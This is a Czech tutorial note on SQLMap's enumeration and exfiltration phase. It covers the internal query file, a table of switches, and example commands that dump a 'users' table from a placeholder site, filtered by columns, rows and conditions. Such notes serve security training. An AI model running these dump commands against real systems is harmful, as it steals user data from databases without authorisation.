## 🔍 Princip enumerace a exfiltrace dat v SQLMapu

Enumerace představuje fázi útoku, ve které po úspěšné detekci zranitelnosti dochází k postupnému vyhledávání a stahování (exfiltraci) struktur a dat z databáze.

### 📜 Interní dotazy SQLMapu (`queries.xml`)

SQLMap obsahuje předdefinovaný soubor XML dotazů pro jednotlivé databázové stroje (DBMS):

- **In-band dotazy:** Používají se u _UNION-based_ a _Error-based_ zranitelností, kde se výsledky vrací přímo v odpovědi serveru.
    
- **Blind dotazy:** Používají se u _Boolean-based_ a _Time-based_ zranitelností, kde se data extrahují řádek po řádku, sloupec po sloupci a bit po bitu.
    

## 📊 Přehled klíčových příkazů pro enumeraci

|**Parametr / Přepínač**|**Funkce**|**Příklad použití**|
|---|---|---|
|**`--banner`**|Zjistí verzi DBMS serveru|`sqlmap -u "..." --banner`|
|**`--current-user`**|Vrátí aktuálního DB uživatele|`sqlmap -u "..." --current-user`|
|**`--current-db`**|Vrátí název aktuální databáze|`sqlmap -u "..." --current-db`|
|**`--is-dba`**|Ověří, zda má uživatel administrátorská práva|`sqlmap -u "..." --is-dba`|
|**`--tables -D <db>`**|Vypíše seznam tabulek ve zvolené DB|`sqlmap -u "..." --tables -D testdb`|
|**`--dump -T <table> -D <db>`**|Stáhne obsah konkrétní tabulky|`sqlmap -u "..." --dump -T users -D testdb`|

## ⚙️ Pokročilé filtrování a selektivní stahování

Při práci s velkými databázemi je často nutné stahování dat omezit nebo specifikovat:

- **Omezení na konkrétní sloupce (`-C`):**
    
    Bash
    
    ```
    sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
    ```
    
- **Omezení na rozsah řádků (`--start` a `--stop`):**
    
    Bash
    
    ```
    sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
    ```
    
- **Podmíněné stahování (`--where`):**
    
    Bash
    
    ```
    sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
    ```
    
- **Kompletní exfiltrace mimo systémové DB (`--dump-all --exclude-sysdbs`):**
    
    Stáhne data ze všech uživatelských databází a přeskočí systémové databáze (např. `information_schema`, `mysql`, `performance_schema`).